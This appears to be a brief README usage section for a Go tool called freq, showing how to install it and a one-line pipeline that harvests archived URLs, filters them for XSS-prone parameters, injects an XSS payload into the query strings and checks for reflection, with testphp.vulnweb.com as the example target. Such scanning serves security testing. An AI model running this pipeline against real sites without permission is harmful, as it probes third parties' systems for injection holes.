how to use:

go install github.com/coffinsp/freq@latest

cd go/bin

sudo mv freq /usr/local/bin

echo testphp.vulnweb.com | waybackurls | gf xss | urldedupe | qsreplace '"><Svg OnLoad=alert(1)>' | freq
